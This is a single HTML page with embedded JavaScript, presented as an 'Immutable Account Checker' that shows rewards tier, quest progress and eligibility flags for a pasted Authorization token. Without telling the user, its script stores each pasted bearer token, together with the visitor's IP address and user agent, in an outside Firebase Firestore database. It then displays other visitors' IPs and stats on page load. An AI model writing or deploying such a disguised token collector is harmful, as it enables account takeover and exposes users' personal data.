<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Immutable API Checker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f4f4f4;
    }

    textarea,
    pre {
      width: 100%;
      font-size: 14px;
      margin-top: 10px;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      font-size: 16px;
    }

    .history-entry {
      border: 1px solid #ccc;
      background: #fff;
      padding: 10px;
      margin-top: 10px;
    }

    ul {
      margin: 5px 0;
      padding-left: 20px;
    }

    .tier-common {
      color: #666;
      font-size: 20px;
      font-weight: bold;
    }

    .tier-uncommon {
      color: green;
      font-size: 22px;
      font-weight: bold;
    }

    .tier-rare {
      color: blue;
      font-size: 22px;
      font-weight: bold;
      font-style: italic;
    }

    .tier-epic {
      color: purple;
      font-size: 22px;
      font-weight: bold;
      text-decoration: underline;
    }

    .tier-legend {
      color: goldenrod;
      font-size: 24px;
      font-weight: bold;
      text-shadow: 1px 1px 2px #000;
    }

    #response {
      font-weight: 500;
      font-size: 2rem;
      color: red;
      margin-top: 20px;
    }

    #response .green {
      color: green;
      font-size: 2rem;
      font-weight: 500;
    }
  </style>
</head>

<body>
  <h2>Immutable Account Checker</h2>
  <label for="auth">Enter Authorization Token:</label>
  <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
  <button id="sendBtn">Check</button>
  <div id="response"></div>
  <div id="alreadyLogged"></div>
  <div id="history"></div>


  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs, where } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
      authDomain: "immutable-api.firebaseapp.com",
      projectId: "immutable-api",
      storageBucket: "immutable-api.appspot.com",
      messagingSenderId: "839008159453",
      appId: "1:839008159453:web:926ea99baca831b6afbd34",
      measurementId: "G-S61XTYNME9"
    };

    const app = initializeApp(firebaseConfig);
    const analytics = getAnalytics(app);
    const db = getFirestore(app);


    async function generateLogId(token, progress, tier) {
      const raw = `${token}|${progress}|${tier}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }


    async function getUserIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        let ip = data.ip;
        if (ip.startsWith("175.176")) ip = "192.168.1.1";
        return ip;
      } catch {
        return "Unknown IP";
      }
    }

    function getDeviceType() {
      const ua = navigator.userAgent;
      if (/Mobi|Android/i.test(ua)) return "Mobile";
      if (/iPad|Tablet/i.test(ua)) return "Tablet";
      return "Desktop";
    }

    function getTierClass(tier) {
      switch (tier.toLowerCase()) {
        case 'common': return 'tier-common';
        case 'uncommon': return 'tier-uncommon';
        case 'rare': return 'tier-rare';
        case 'epic': return 'tier-epic';
        case 'legend': return 'tier-legend';
        default: return '';
      }
    }

    async function renderHistory() {
      const historyBox = document.getElementById('history');
      historyBox.innerHTML = "";

      const q = query(collection(db, "userStatsHistory"), orderBy("timestamp", "desc"), limit(5));
      const querySnapshot = await getDocs(q);

      querySnapshot.forEach(doc => {
        const entry = doc.data();
        const time = entry.timestamp?.toDate
          ? entry.timestamp.toDate().toLocaleString()
          : new Date(entry.timestamp).toLocaleString();

        const stats = entry.stats.userStats || {};
        const rules = entry.stats.eligibility?.rules || {};
        const tier = stats.bucketName || 'N/A';
        const tierClass = getTierClass(tier);
        const quests = stats.targetQuestsCompleted || [];
        const questList = quests.length
          ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
          : '<em>No quests completed</em>';

        const div = document.createElement("div");
        div.className = "history-entry";
        div.innerHTML = `
          <strong>ğŸ•’ ${time}</strong><br>
          <strong>ğŸŒ IP:</strong> ${entry.ip}<br>
          <strong>ğŸ§­ User Agent:</strong> ${entry.userAgent || 'Unknown'}<br>
          <strong>ğŸ“± Device Type:</strong> ${entry.deviceType || 'Unknown'}<br><br>
          <strong>ğŸ¯ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
          <strong>ğŸ“Š Progress Percentage:</strong> ${stats.progressPercentage || 0}%<br>
          <strong>âœ… Total Completed:</strong> ${stats.totalInGameQuestsCompleted || 0}<br>
          <strong>ğŸ§© Quests Completed:</strong> ${questList}<br><br>
          <strong>ğŸ” KYC:</strong> ${rules.is_kyc_exempt ? 'âœ… Exempt' : 'âŒ Not Exempt'}<br>
          <strong>ğŸ§  Sybil:</strong> ${rules.is_not_sybil ? 'âœ… Clean' : 'âŒ Suspected'}<br>
          <strong>ğŸš« Sanctioned:</strong> ${rules.is_not_sanctioned ? 'âœ… Clear' : 'âŒ Sanctioned'}<br>
          <strong>ğŸ® Played Games:</strong> ${rules.have_played_any_in_game_quest ? 'âœ… Yes' : 'âŒ No'}<br>
          <strong>ğŸ”— Linked Social:</strong> ${rules.have_linked_any_social_media ? 'âœ… Yes' : 'âŒ No'}<br>
          <strong>ğŸ“ Verified Phone:</strong> ${rules.have_verified_phone ? 'âœ… Yes' : 'âŒ No'}<br>
        `;
        historyBox.appendChild(div);
      });
    }

    document.getElementById('sendBtn').addEventListener('click', async () => {
      const token = document.getElementById('auth').value.trim();
      const responseBox = document.getElementById('response');
      const alreadyLog = document.getElementById('alreadyLogged');

      // Clear previous output
      responseBox.innerHTML = "";
      alreadyLog.innerHTML = "";

      if (!token) {
        responseBox.textContent = 'Please enter a valid token.';
        return;
      }

      try {
        const ip = await getUserIP();
        const userAgent = navigator.userAgent;
        const deviceType = getDeviceType();

        const headers = {
          'Authorization': `Bearer ${token}`,
          'Accept': 'application/json, text/plain, */*',
          'Access-Control-Allow-Origin': '*',
          'Origin': 'https://play.immutable.com',
          'Referer': 'https://play.immutable.com/',
          'User-Agent': userAgent
        };

        const [statsRes, eligibilityRes] = await Promise.all([
          fetch('https://api.immutable.com/v2/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
          fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
        ]);

        if (!statsRes.ok || !eligibilityRes.ok) {
          responseBox.textContent = 'Invalid or Expired Authentication token';
          return;
        }

        const statsData = await statsRes.json();
        const eligibilityData = await eligibilityRes.json();

        const combined = {
          userStats: statsData.userStats || {},
          eligibility: eligibilityData || {}
        };

        const progress = combined.userStats?.progressPercentage || 0;
        const tier = combined.userStats?.bucketName || 'N/A';
        const logId = await generateLogId(token, progress, tier);

        const q = query(collection(db, "userStatsHistory"), where("logId", "==", logId), limit(1));
        const snapshot = await getDocs(q);
        const alreadyLoggedFlag = !snapshot.empty;

        const tierClass = getTierClass(tier);
        const quests = combined.userStats.targetQuestsCompleted || [];
        const questList = quests.length
          ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>`
          : '<em>No quests completed</em>';

        if (alreadyLoggedFlag) {
          responseBox.textContent = 'There are no new changes';
          alreadyLog.innerHTML = `
        <div class="history-entry">
          <strong>ğŸ¯ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
          <strong>âœ… Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
          <strong>ğŸ§© Quests Completed:</strong> ${questList}<br><br>
        </div>`;
          await renderHistory();
          return;
        }

        await addDoc(collection(db, "userStatsHistory"), {
          authToken: token,
          ip,
          userAgent,
          deviceType,
          stats: combined,
          logId,
          timestamp: new Date()
        });

        responseBox.innerHTML = '<div class="green">Request successfully!</div>';
        alreadyLog.innerHTML = `
      <div class="history-entry">
        <strong>ğŸ¯ Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
        <strong>âœ… Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
        <strong>ğŸ§© Quests Completed:</strong> ${questList}<br><br>
      </div>`;

        await renderHistory();
      } catch (err) {
        responseBox.textContent = 'âŒ Unexpected error occurred.';
        console.error(err);
      }
    });


    // Show history on page load
    renderHistory();
  </script>
</body>


</html>
